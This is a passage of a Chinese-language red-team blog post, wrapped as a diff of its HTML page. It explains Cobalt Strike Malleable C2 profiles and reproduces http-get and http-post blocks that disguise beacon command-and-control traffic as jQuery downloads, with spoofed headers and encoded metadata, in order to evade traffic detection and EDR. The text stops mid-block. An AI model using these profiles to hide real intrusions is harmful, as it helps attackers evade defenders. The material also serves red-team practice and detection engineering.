@@ -1,0 +1,759 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <title>MalleableC2详解 // Y4ph3tS blog</title>
+    <link rel="shortcut icon" href="/favicon.ico" />
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.139.3">
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="Y4ph3tS" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="/css/main.min.5b1fcc8902588589c4767187402a3c29f8b8d7a6fdef6d9f8f77045bb0d14fee.css" />
+    
+
+    
+    
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="MalleableC2详解">
+  <meta name="twitter:description" content="malleable C2和Malleable PE malleable C2 用于规避流量检测
+官网链接：https://www.cobaltstrike.com/help-malleable-c2
+需要考虑网络环境，根据目标网络编写Malleable C2 Profile
+C2的配置可包含以下部分
+Profile元素
+global OPTIONS
+https-certificate
+code-signer
+http-get
+http-post
+http-stager
+post-ex
+TCP Beacon
+…
+在 Malleable C2 中, 语句可分为数据转换语句, 终止语句和额外语句三种类型。
+数据转换语句：base64 base64url mask netbios netbiosu prepend append终止语句： print uri-append header parameter额外语句： header parameter 数据转换语句如下：
+声明方式 编码方式 append “string” 将指定字符串附加在末尾 base64 Base64编码 base64url 一种变异的Base64编码(这种编码后的数据不会含义破坏url完整性的字符如&#43;号) mask XOR编码 key是随机的 netbios NetBIOS Encode ‘a’ netbiosu NetBIOS Encode ‘A’ 上面这种编码方式我也不怎么了解反正我只知道也是一种编码方式，有兴趣的自己谷歌一下吧 prepend “string” 将指定字符串附加在头部 Strings转义字符如下：">
+
+    <meta property="og:url" content="https://yaphetszz.github.io/posts/malleablec2%E8%AF%A6%E8%A7%A3/">
+  <meta property="og:site_name" content="Y4ph3tS blog">
+  <meta property="og:title" content="MalleableC2详解">
+  <meta property="og:description" content="malleable C2和Malleable PE malleable C2 用于规避流量检测
+官网链接：https://www.cobaltstrike.com/help-malleable-c2
+需要考虑网络环境，根据目标网络编写Malleable C2 Profile
+C2的配置可包含以下部分
+Profile元素
+global OPTIONS
+https-certificate
+code-signer
+http-get
+http-post
+http-stager
+post-ex
+TCP Beacon
+…
+在 Malleable C2 中, 语句可分为数据转换语句, 终止语句和额外语句三种类型。
+数据转换语句：base64 base64url mask netbios netbiosu prepend append终止语句： print uri-append header parameter额外语句： header parameter 数据转换语句如下：
+声明方式 编码方式 append “string” 将指定字符串附加在末尾 base64 Base64编码 base64url 一种变异的Base64编码(这种编码后的数据不会含义破坏url完整性的字符如&#43;号) mask XOR编码 key是随机的 netbios NetBIOS Encode ‘a’ netbiosu NetBIOS Encode ‘A’ 上面这种编码方式我也不怎么了解反正我只知道也是一种编码方式，有兴趣的自己谷歌一下吧 prepend “string” 将指定字符串附加在头部 Strings转义字符如下：">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2020-04-13T15:18:36+08:00">
+    <meta property="article:modified_time" content="2020-04-13T15:18:36+08:00">
+    <meta property="article:tag" content="红队技术">
+    <meta property="article:tag" content="CobaltStrike">
+    <meta property="article:tag" content="C2">
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://yaphetszz.github.io/"><img class="app-header-avatar" src="/avatar.jpg" alt="Y4ph3tS" /></a>
+      <span class="app-header-title">Y4ph3tS blog</span>
+      <nav class="app-header-menu">
+          <a class="app-header-menu-item" href="/">主页</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/categories/">分类</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/tags/">标签</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/about/">关于</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/links/">友链</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/atta/">附件</a>
+      </nav>
+      <p>Valar Morghulis</p>
+      <div class="app-header-social">
+        
+          <a href="https://github.com/yaphetszz" target="_blank" rel="noreferrer noopener me">
+            <svg class="icon icon-brand-github" viewBox="0 0 24 24" fill="currentColor"><title>GitHub</title><path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"/></svg>
+          </a>
+        
+      </div>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">MalleableC2详解</h1>
+      <div class="post-meta">
+        <div>
+          <svg class="icon icon-calendar" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><title>calendar</title><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>
+          Apr 13, 2020
+        </div>
+        <div>
+          <svg class="icon icon-clock" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><title>clock</title><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>
+          
+          26125 Words - 
+          
+          52 min read
+        </div>
+          <p>创建时间: 2020-04-13 15:18</p>
+        
+           
+          
+          <p>最后修改时间: 2024-12-07 23:51</p>
+          
+        
+        <div>
+          <svg class="icon icon-tag" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><title>tag</title><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7.01" y2="7"></line></svg>
+              <a class="tag" href="https://yaphetszz.github.io/tags/%E7%BA%A2%E9%98%9F%E6%8A%80%E6%9C%AF/">红队技术</a>
+              <a class="tag" href="https://yaphetszz.github.io/tags/cobaltstrike/">CobaltStrike</a>
+              <a class="tag" href="https://yaphetszz.github.io/tags/c2/">C2</a>
+        </div>
+        <div>
+          <p></p>
+          <p>文章分类:    </p>
+              <a class="tag" href="https://yaphetszz.github.io/categories/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/">攻防渗透</a>
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <h2 id="malleable-c2和malleable-pe">malleable C2和Malleable PE</h2>
+<p>malleable C2 用于规避流量检测</p>
+<p>官网链接：https://www.cobaltstrike.com/help-malleable-c2</p>
+<p>需要考虑网络环境，根据目标网络编写Malleable C2 Profile</p>
+<p>C2的配置可包含以下部分</p>
+<ul>
+<li>
+<p>Profile元素</p>
+</li>
+<li>
+<p>global OPTIONS</p>
+</li>
+<li>
+<p>https-certificate</p>
+</li>
+<li>
+<p>code-signer</p>
+</li>
+<li>
+<p>http-get</p>
+</li>
+<li>
+<p>http-post</p>
+</li>
+<li>
+<p>http-stager</p>
+</li>
+<li>
+<p>post-ex</p>
+</li>
+<li>
+<p>TCP Beacon</p>
+</li>
+<li>
+<p>&hellip;</p>
+</li>
+</ul>
+<p>在 Malleable C2 中, 语句可分为数据转换语句, 终止语句和额外语句三种类型。</p>
+<pre tabindex="0"><code>数据转换语句：base64 base64url mask netbios netbiosu prepend append
+终止语句： print uri-append header parameter
+额外语句： header parameter
+</code></pre><p>数据转换语句如下：</p>
+<table>
+  <thead>
+      <tr>
+          <th>声明方式</th>
+          <th>编码方式</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>append &ldquo;string&rdquo;</td>
+          <td>将指定字符串附加在末尾</td>
+      </tr>
+      <tr>
+          <td>base64</td>
+          <td>Base64编码</td>
+      </tr>
+      <tr>
+          <td>base64url</td>
+          <td>一种变异的Base64编码(这种编码后的数据不会含义破坏url完整性的字符如+号)</td>
+      </tr>
+      <tr>
+          <td>mask</td>
+          <td>XOR编码 key是随机的</td>
+      </tr>
+      <tr>
+          <td>netbios</td>
+          <td>NetBIOS Encode &lsquo;a&rsquo;</td>
+      </tr>
+      <tr>
+          <td>netbiosu</td>
+          <td>NetBIOS Encode &lsquo;A&rsquo;</td>
+      </tr>
+      <tr>
+          <td></td>
+          <td>上面这种编码方式我也不怎么了解反正我只知道也是一种编码方式，有兴趣的自己谷歌一下吧</td>
+      </tr>
+      <tr>
+          <td>prepend &ldquo;string&rdquo;</td>
+          <td>将指定字符串附加在头部</td>
+      </tr>
+  </tbody>
+</table>
+<p>Strings转义字符如下：</p>
+<table>
+  <thead>
+      <tr>
+          <th><strong>值</strong></th>
+          <th><strong>含义</strong></th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>&ldquo;\n&rdquo;</td>
+          <td>换行符</td>
+      </tr>
+      <tr>
+          <td>&ldquo;\r&rdquo;</td>
+          <td>回车</td>
+      </tr>
+      <tr>
+          <td>&ldquo;\t&rdquo;</td>
+          <td>tab键</td>
+      </tr>
+      <tr>
+          <td>&ldquo;\u####&rdquo;</td>
+          <td>表示一个unicode字符</td>
+      </tr>
+      <tr>
+          <td>&ldquo;\x##&rdquo;</td>
+          <td>十六进制（shellcode知道吧就是那东西的写法\x90\x90）</td>
+      </tr>
+      <tr>
+          <td>&ldquo;&quot;</td>
+          <td>\</td>
+      </tr>
+  </tbody>
+</table>
+<p>终止关键字如下：</p>
+<table>
+  <thead>
+      <tr>
+          <th><strong>声明方式</strong></th>
+          <th><strong>数据存放位置</strong></th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>header &ldquo;header&rdquo;</td>
+          <td>将数据存储在指定HTTP头中</td>
+      </tr>
+      <tr>
+          <td>parameter &ldquo;key&rdquo;</td>
+          <td>将数据存储在指定URI参数中</td>
+      </tr>
+      <tr>
+          <td>print</td>
+          <td>将数据存储在http body中</td>
+      </tr>
+      <tr>
+          <td>uri-append</td>
+          <td>直接附加到URI后面使用此终止语句请不要使用base64而是改为base64url因为普通的base64编码会带有+号，放到url中会转义</td>
+      </tr>
+  </tbody>
+</table>
+<p>http-get.server.output，http-post.server.output和http-stager.server.output这个三个代码块不能使用其他的终止语句只能使用print语句，http-get.client.metadata则是不能使用print当作终止语句的原因和get body传参有关</p>
+<p>CS Beacon的通信方式如下：</p>
+<ol>
+<li>Beacon给Teamserver发送一个HTTP GET请求，包含主机的元数据信息（如系统类型、版本、当前用户等）后进入睡眠状态</li>
+<li>Teamserver给目标发送指令</li>
+<li>Beacon返回执行完命令的回显后进入睡眠</li>
+<li>Teamserver要求终止任务</li>
+</ol>
+<p><img src="../index_files/beacon_transaction.png" alt="Beacon transaction"></p>
+<h2 id="malleablepe">MalleablePE</h2>
+<p>Malleable PE  直译就是可拓展PE，通常在实战环境下会针对Loader进行免杀，并不会考虑针对beacon进行免杀，这就导致了很多杀软/EDR的内存防护能针对默认设置的beacon进行查杀。C2Profile提供了很好地操作beacon的方法，C2Profile不仅仅可以自定义beacon的通信属性(例如uri，header等等)，还可以对beacon进行操作，从而实现免杀的目的。</p>
+<h2 id="环境说明">环境说明</h2>
+<p>kali linux 2019.3</p>
+<p>Cobaltstrike 4.0</p>
+<h2 id="配置项详解">配置项详解</h2>
+<p>以一个模板文件进行分析，模板文件来自github仓库<a href="https://github.com/threatexpress/malleable-c2">malleable-c2</a>，按照对应的cs版本下载profile文件进行配置，以下为每个模块的释义</p>
+<h3 id="global-options">[global OPTIONS]</h3>
+<p>公共部分包含配置文件名称、sleeptimes、jitter、host_stage、useragent</p>
+<h4 id="profile-name">[Profile Name]</h4>
+<p><img src="../index_files/image-20241207151428396.png" alt="image-20241207151428396"></p>
+<h4 id="sleep-times">[Sleep Times]</h4>
+<p><img src="../index_files/image-20241205233451004.png" alt="image-20241205233451004"></p>
+<p>模板示例中sleeptime为beacon的休眠时间，jitter为随机值，避免每次响应时间相同导致被发现，例如此时设置的基准值为45秒，加上37%的浮动，即每次的响应时间为28-45秒</p>
+<h4 id="user-agent">[User-Agent]</h4>
+<p>UA头的设置，使用默认的UA头可以伪装成正常浏览请求，防止某些安全设备的告警</p>
+<p><img src="../index_files/image-20241206003720715.png" alt="image-20241206003720715"></p>
+<h3 id="ssl-certificate">[SSL CERTIFICATE]</h3>
+<p>此处可配置SSL证书，通过keytool可以生成自签证书</p>
+<p><img src="../index_files/image-20241206004418093.png" alt="image-20241206004418093"></p>
+<h3 id="http-get">[http-get]</h3>
+<p>以下为profile示例中的http-get</p>
+<pre tabindex="0"><code>http-get {
+
+    set uri &#34;/jquery-3.3.1.min.js&#34;;
+    set verb &#34;GET&#34;;
+
+    client {
+
+        header &#34;Accept&#34; &#34;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#34;;
+        #header &#34;Host&#34; &#34;code.jquery.com&#34;;
+        header &#34;Referer&#34; &#34;http://code.jquery.com/&#34;;
+        header &#34;Accept-Encoding&#34; &#34;gzip, deflate&#34;;
+
+        metadata {
+            base64url;
+            prepend &#34;__cfduid=&#34;;
+            header &#34;Cookie&#34;;
+        }
+    }
+
+    server {
+
+        header &#34;Server&#34; &#34;NetDNA-cache/2.2&#34;;
+        header &#34;Cache-Control&#34; &#34;max-age=0, no-cache&#34;;
+        header &#34;Pragma&#34; &#34;no-cache&#34;;
+        header &#34;Connection&#34; &#34;keep-alive&#34;;
+        header &#34;Content-Type&#34; &#34;application/javascript; charset=utf-8&#34;;
+
+        output {   
+            mask;
+            base64url;
+            ## The javascript was changed.  Double quotes and backslashes were escaped to properly render (Refer to Tips for Profile Parameter Values)
+            # 2nd Line            
+            prepend &#34;!function(e,t){\&#34;use strict\&#34;;\&#34;object\&#34;==typeof module&amp;&amp;\&#34;object\&#34;==typeof module.exports?module.exports=e.document?t(e,!0):function(e){if(!e.document)throw new Error(\&#34;jQuery requires a window with a document\&#34;);return t(e)}:t(e)}(\&#34;undefined\&#34;!=typeof window?window:this,function(e,t){\&#34;use strict\&#34;;var n=[],r=e.document,i=Object.getPrototypeOf,o=n.slice,a=n.concat,s=n.push,u=n.indexOf,l={},c=l.toString,f=l.hasOwnProperty,p=f.toString,d=p.call(Object),h={},g=function e(t){return\&#34;function\&#34;==typeof t&amp;&amp;\&#34;number\&#34;!=typeof t.nodeType},y=function e(t){return null!=t&amp;&amp;t===t.window},v={type:!0,src:!0,noModule:!0};function m(e,t,n){var i,o=(t=t||r).createElement(\&#34;script\&#34;);if(o.text=e,n)for(i in v)n[i]&amp;&amp;(o[i]=n[i]);t.head.appendChild(o).parentNode.removeChild(o)}function x(e){return null==e?e+\&#34;\&#34;:\&#34;object\&#34;==typeof e||\&#34;function\&#34;==typeof e?l[c.call(e)]||\&#34;object\&#34;:typeof e}var b=\&#34;3.3.1\&#34;,w=function(e,t){return new w.fn.init(e,t)},T=/^[\\s\\uFEFF\\xA0]+|[\\s\\uFEFF\\xA0]+$/g;w.fn=w.prototype={jquery:\&#34;3.3.1\&#34;,constructor:w,length:0,toArray:function(){return o.call(this)},get:function(e){return null==e?o.call(this):e&lt;0?this[e+this.length]:this[e]},pushStack:function(e){var t=w.merge(this.constructor(),e);return t.prevObject=this,t},each:function(e){return w.each(this,e)},map:function(e){return this.pushStack(w.map(this,function(t,n){return e.call(t,n,t)}))},slice:function(){return this.pushStack(o.apply(this,arguments))},first:function(){return this.eq(0)},last:function(){return this.eq(-1)},eq:function(e){var t=this.length,n=+e+(e&lt;0?t:0);return this.pushStack(n&gt;=0&amp;&amp;n&lt;t?[this[n]]:[])},end:function(){return this.prevObject||this.constructor()},push:s,sort:n.sort,splice:n.splice},w.extend=w.fn.extend=function(){var e,t,n,r,i,o,a=arguments[0]||{},s=1,u=arguments.length,l=!1;for(\&#34;boolean\&#34;==typeof a&amp;&amp;(l=a,a=arguments[s]||{},s++),\&#34;object\&#34;==typeof a||g(a)||(a={}),s===u&amp;&amp;(a=this,s--);s&lt;u;s++)if(null!=(e=arguments[s]))for(t in e)n=a[t],a!==(r=e[t])&amp;&amp;(l&amp;&amp;r&amp;&amp;(w.isPlainObject(r)||(i=Array.isArray(r)))?(i?(i=!1,o=n&amp;&amp;Array.isArray(n)?n:[]):o=n&amp;&amp;w.isPlainObject(n)?n:{},a[t]=w.extend(l,o,r)):void 0!==r&amp;&amp;(a[t]=r));return a},w.extend({expando:\&#34;jQuery\&#34;+(\&#34;3.3.1\&#34;+Math.random()).replace(/\\D/g,\&#34;\&#34;),isReady:!0,error:function(e){throw new Error(e)},noop:function(){},isPlainObject:function(e){var t,n;return!(!e||\&#34;[object Object]\&#34;!==c.call(e))&amp;&amp;(!(t=i(e))||\&#34;function\&#34;==typeof(n=f.call(t,\&#34;constructor\&#34;)&amp;&amp;t.constructor)&amp;&amp;p.call(n)===d)},isEmptyObject:function(e){var t;for(t in e)return!1;return!0},globalEval:function(e){m(e)},each:function(e,t){var n,r=0;if(C(e)){for(n=e.length;r&lt;n;r++)if(!1===t.call(e[r],r,e[r]))break}else for(r in e)if(!1===t.call(e[r],r,e[r]))break;return e},trim:function(e){return null==e?\&#34;\&#34;:(e+\&#34;\&#34;).replace(T,\&#34;\&#34;)},makeArray:function(e,t){var n=t||[];return null!=e&amp;&amp;(C(Object(e))?w.merge(n,\&#34;string\&#34;==typeof e?[e]:e):s.call(n,e)),n},inArray:function(e,t,n){return null==t?-1:u.call(t,e,n)},merge:function(e,t){for(var n=+t.length,r=0,i=e.length;r&lt;n;r++)e[i++]=t[r];return e.length=i,e},grep:function(e,t,n){for(var r,i=[],o=0,a=e.length,s=!n;o&lt;a;o++)(r=!t(e[o],o))!==s&amp;&amp;i.push(e[o]);return i},map:function(e,t,n){var r,i,o=0,s=[];if(C(e))for(r=e.length;o&lt;r;o++)null!=(i=t(e[o],o,n))&amp;&amp;s.push(i);else for(o in e)null!=(i=t(e[o],o,n))&amp;&amp;s.push(i);return a.apply([],s)},guid:1,support:h}),\&#34;function\&#34;==typeof Symbol&amp;&amp;(w.fn[Symbol.iterator]=n[Symbol.iterator]),w.each(\&#34;Boolean Number String Function Array Date RegExp Object Error Symbol\&#34;.split(\&#34; \&#34;),function(e,t){l[\&#34;[object \&#34;+t+\&#34;]\&#34;]=t.toLowerCase()});function C(e){var t=!!e&amp;&amp;\&#34;length\&#34;in e&amp;&amp;e.length,n=x(e);return!g(e)&amp;&amp;!y(e)&amp;&amp;(\&#34;array\&#34;===n||0===t||\&#34;number\&#34;==typeof t&amp;&amp;t&gt;0&amp;&amp;t-1 in e)}var E=function(e){var t,n,r,i,o,a,s,u,l,c,f,p,d,h,g,y,v,m,x,b=\&#34;sizzle\&#34;+1*new Date,w=e.document,T=0,C=0,E=ae(),k=ae(),S=ae(),D=function(e,t){return e===t&amp;&amp;(f=!0),0},N={}.hasOwnProperty,A=[],j=A.pop,q=A.push,L=A.push,H=A.slice,O=function(e,t){for(var n=0,r=e.length;n&lt;r;n++)if(e[n]===t)return n;return-1},P=\&#34;\r&#34;;
+            # 1st Line
+            prepend &#34;/*! jQuery v3.3.1 | (c) JS Foundation and other contributors | jquery.org/license */&#34;;
+            append &#34;\&#34;.(o=t.documentElement,Math.max(t.body[\&#34;scroll\&#34;+e],o[\&#34;scroll\&#34;+e],t.body[\&#34;offset\&#34;+e],o[\&#34;offset\&#34;+e],o[\&#34;client\&#34;+e])):void 0===i?w.css(t,n,s):w.style(t,n,i,s)},t,a?i:void 0,a)}})}),w.each(\&#34;blur focus focusin focusout resize scroll click dblclick mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave change select submit keydown keypress keyup contextmenu\&#34;.split(\&#34; \&#34;),function(e,t){w.fn[t]=function(e,n){return arguments.length&gt;0?this.on(t,null,e,n):this.trigger(t)}}),w.fn.extend({hover:function(e,t){return this.mouseenter(e).mouseleave(t||e)}}),w.fn.extend({bind:function(e,t,n){return this.on(e,null,t,n)},unbind:function(e,t){return this.off(e,null,t)},delegate:function(e,t,n,r){return this.on(t,e,n,r)},undelegate:function(e,t,n){return 1===arguments.length?this.off(e,\&#34;**\&#34;):this.off(t,e||\&#34;**\&#34;,n)}}),w.proxy=function(e,t){var n,r,i;if(\&#34;string\&#34;==typeof t&amp;&amp;(n=e[t],t=e,e=n),g(e))return r=o.call(arguments,2),i=function(){return e.apply(t||this,r.concat(o.call(arguments)))},i.guid=e.guid=e.guid||w.guid++,i},w.holdReady=function(e){e?w.readyWait++:w.ready(!0)},w.isArray=Array.isArray,w.parseJSON=JSON.parse,w.nodeName=N,w.isFunction=g,w.isWindow=y,w.camelCase=G,w.type=x,w.now=Date.now,w.isNumeric=function(e){var t=w.type(e);return(\&#34;number\&#34;===t||\&#34;string\&#34;===t)&amp;&amp;!isNaN(e-parseFloat(e))},\&#34;function\&#34;==typeof define&amp;&amp;define.amd&amp;&amp;define(\&#34;jquery\&#34;,[],function(){return w});var Jt=e.jQuery,Kt=e.$;return w.noConflict=function(t){return e.$===w&amp;&amp;(e.$=Kt),t&amp;&amp;e.jQuery===w&amp;&amp;(e.jQuery=Jt),w},t||(e.jQuery=e.$=w),w});&#34;;
+            print;
+        }
+    }
+}
+</code></pre><p>set-uri用于设置请求的uri地址，此处为固定的jquery，如设置多个值，则会自动从中随机选取</p>
+<p>client和server是Beacon的请求规则和Teamserver的响应规则，其中metadata部分会进行base64编码</p>
+<h3 id="http-post">[http-post]</h3>
+<pre tabindex="0"><code>http-post {
+
+    set uri &#34;/jquery-3.3.2.min.js&#34;;
+    set verb &#34;POST&#34;;
+
+    client {
+
+        header &#34;Accept&#34; &#34;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#34;;
+        #header &#34;Host&#34; &#34;code.jquery.com&#34;;
+        header &#34;Referer&#34; &#34;http://code.jquery.com/&#34;;
+        header &#34;Accept-Encoding&#34; &#34;gzip, deflate&#34;;
+       
+        id {
+            mask;       
+            base64url;
+            parameter &#34;__cfduid&#34;;            
+        }
+              
+        output {
+            mask;
+            base64url;
+            print;
+        }
+    }
+
+    server {
+
+        header &#34;Server&#34; &#34;NetDNA-cache/2.2&#34;;
+        header &#34;Cache-Control&#34; &#34;max-age=0, no-cache&#34;;
+        header &#34;Pragma&#34; &#34;no-cache&#34;;
+        header &#34;Connection&#34; &#34;keep-alive&#34;;
+        header &#34;Content-Type&#34; &#34;application/javascript; charset=utf-8&#34;;
+
+        output {
+            mask;
+            base64url;
+            ## The javascript was changed.  Double quotes and backslashes were escaped to properly render (Refer to Tips for Profile Parameter Values)
+            # 2nd Line            
+            prepend &#34;!function(e,t){\&#34;use strict\&#34;;\&#34;object\&#34;==typeof module&amp;&amp;\&#34;object\&#34;==typeof module.exports?module.exports=e.document?t(e,!0):function(e){if(!e.document)throw new Error(\&#34;jQuery requires a window with a document\&#34;);return t(e)}:t(e)}(\&#34;undefined\&#34;!=typeof window?window:this,function(e,t){\&#34;use strict\&#34;;var n=[],r=e.document,i=Object.getPrototypeOf,o=n.slice,a=n.concat,s=n.push,u=n.indexOf,l={},c=l.toString,f=l.hasOwnProperty,p=f.toString,d=p.call(Object),h={},g=function e(t){return\&#34;function\&#34;==typeof t&amp;&amp;\&#34;number\&#34;!=typeof t.nodeType},y=function e(t){return null!=t&amp;&amp;t===t.window},v={type:!0,src:!0,noModule:!0};function m(e,t,n){var i,o=(t=t||r).createElement(\&#34;script\&#34;);if(o.text=e,n)for(i in v)n[i]&amp;&amp;(o[i]=n[i]);t.head.appendChild(o).parentNode.removeChild(o)}function x(e){return null==e?e+\&#34;\&#34;:\&#34;object\&#34;==typeof e||\&#34;function\&#34;==typeof e?l[c.call(e)]||\&#34;object\&#34;:typeof e}var b=\&#34;3.3.1\&#34;,w=function(e,t){return new w.fn.init(e,t)},T=/^[\\s\\uFEFF\\xA0]+|[\\s\\uFEFF\\xA0]+$/g;w.fn=w.prototype={jquery:\&#34;3.3.1\&#34;,constructor:w,length:0,toArray:function(){return o.call(this)},get:function(e){return null==e?o.call(this):e&lt;0?this[e+this.length]:this[e]},pushStack:function(e){var t=w.merge(this.constructor(),e);return t.prevObject=this,t},each:function(e){return w.each(this,e)},map:function(e){return this.pushStack(w.map(this,function(t,n){return e.call(t,n,t)}))},slice:function(){return this.pushStack(o.apply(this,arguments))},first:function(){return this.eq(0)},last:function(){return this.eq(-1)},eq:function(e){var t=this.length,n=+e+(e&lt;0?t:0);return this.pushStack(n&gt;=0&amp;&amp;n&lt;t?[this[n]]:[])},end:function(){return this.prevObject||this.constructor()},push:s,sort:n.sort,splice:n.splice},w.extend=w.fn.extend=function(){var e,t,n,r,i,o,a=arguments[0]||{},s=1,u=arguments.length,l=!1;for(\&#34;boolean\&#34;==typeof a&amp;&amp;(l=a,a=arguments[s]||{},s++),\&#34;object\&#34;==typeof a||g(a)||(a={}),s===u&amp;&amp;(a=this,s--);s&lt;u;s++)if(null!=(e=arguments[s]))for(t in e)n=a[t],a!==(r=e[t])&amp;&amp;(l&amp;&amp;r&amp;&amp;(w.isPlainObject(r)||(i=Array.isArray(r)))?(i?(i=!1,o=n&amp;&amp;Array.isArray(n)?n:[]):o=n&amp;&amp;w.isPlainObject(n)?n:{},a[t]=w.extend(l,o,r)):void 0!==r&amp;&amp;(a[t]=r));return a},w.extend({expando:\&#34;jQuery\&#34;+(\&#34;3.3.1\&#34;+Math.random()).replace(/\\D/g,\&#34;\&#34;),isReady:!0,error:function(e){throw new Error(e)},noop:function(){},isPlainObject:function(e){var t,n;return!(!e||\&#34;[object Object]\&#34;!==c.call(e))&amp;&amp;(!(t=i(e))||\&#34;function\&#34;==typeof(n=f.call(t,\&#34;constructor\&#34;)&amp;&amp;t.constructor)&amp;&amp;p.call(n)===d)},isEmptyObject:function(e){var t;for(t in e)return!1;return!0},globalEval:function(e){m(e)},each:function(e,t){var n,r=0;if(C(e)){for(n=e.length;r&lt;n;r++)if(!1===t.call(e[r],r,e[r]))break}else for(r in e)if(!1===t.call(e[r],r,e[r]))break;return e},trim:function(e){return null==e?\&#34;\&#34;:(e+\&#34;\&#34;).replace(T,\&#34;\&#34;)},makeArray:function(e,t){var n=t||[];return null!=e&amp;&amp;(C(Object(e))?w.merge(n,\&#34;string\&#34;==typeof e?[e]:e):s.call(n,e)),n},inArray:function(e,t,n){return null==t?-1:u.call(t,e,n)},merge:function(e,t){for(var n=+t.length,r=0,i=e.length;r&lt;n;r++)e[i++]=t[r];return e.length=i,e},grep:function(e,t,n){for(var r,i=[],o=0,a=e.length,s=!n;o&lt;a;o++)(r=!t(e[o],o))!==s&amp;&amp;i.push(e[o]);return i},map:function(e,t,n){var r,i,o=0,s=[];if(C(e))for(r=e.length;o&lt;r;o++)null!=(i=t(e[o],o,n))&amp;&amp;s.push(i);else for(o in e)null!=(i=t(e[o],o,n))&amp;&amp;s.push(i);return a.apply([],s)},guid:1,support:h}),\&#34;function\&#34;==typeof Symbol&amp;&amp;(w.fn[Symbol.iterator]=n[Symbol.iterator]),w.each(\&#34;Boolean Number String Function Array Date RegExp Object Error Symbol\&#34;.split(\&#34; \&#34;),function(e,t){l[\&#34;[object \&#34;+t+\&#34;]\&#34;]=t.toLowerCase()});function C(e){var t=!!e&amp;&amp;\&#34;length\&#34;in e&amp;&amp;e.length,n=x(e);return!g(e)&amp;&amp;!y(e)&amp;&amp;(\&#34;array\&#34;===n||0===t||\&#34;number\&#34;==typeof t&amp;&amp;t&gt;0&amp;&amp;t-1 in e)}var E=function(e){var t,n,r,i,o,a,s,u,l,c,f,p,d,h,g,y,v,m,x,b=\&#34;sizzle\&#34;+1*new Date,w=e.document,T=0,C=0,E=ae(),k=ae(),S=ae(),D=function(e,t){return e===t&amp;&amp;(f=!0),0},N={}.hasOwnProperty,A=[],j=A.pop,q=A.push,L=A.push,H=A.slice,O=function(e,t){for(var n=0,r=e.length;n&lt;r;n++)if(e[n]===t)return n;return-1},P=\&#34;\r&#34;;
+            # 1st Line
+            prepend &#34;/*! jQuery v3.3.1 | (c) JS Foundation and other contributors | jquery.org/license */&#34;;
+            append &#34;\&#34;.(o=t.documentElement,Math.max(t.body[\&#34;scroll\&#34;+e],o[\&#34;scroll\&#34;+e],t.body[\&#34;offset\&#34;+e],o[\&#34;offset\&#34;+e],o[\&#34;client\&#34;+e])):void 0===i?w.css(t,n,s):w.style(t,n,i,s)},t,a?i:void 0,a)}})}),w.each(\&#34;blur focus focusin focusout resize scroll click dblclick mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave change select submit keydown keypress keyup contextmenu\&#34;.split(\&#34; \&#34;),function(e,t){w.fn[t]=function(e,n){return arguments.length&gt;0?this.on(t,null,e,n):this.trigger(t)}}),w.fn.extend({hover:function(e,t){return this.mouseenter(e).mouseleave(t||e)}}),w.fn.extend({bind:function(e,t,n){return this.on(e,null,t,n)},unbind:function(e,t){return this.off(e,null,t)},delegate:function(e,t,n,r){return this.on(t,e,n,r)},undelegate:function(e,t,n){return 1===arguments.length?this.off(e,\&#34;**\&#34;):this.off(t,e||\&#34;**\&#34;,n)}}),w.proxy=function(e,t){var n,r,i;if(\&#34;string\&#34;==typeof t&amp;&amp;(n=e[t],t=e,e=n),g(e))return 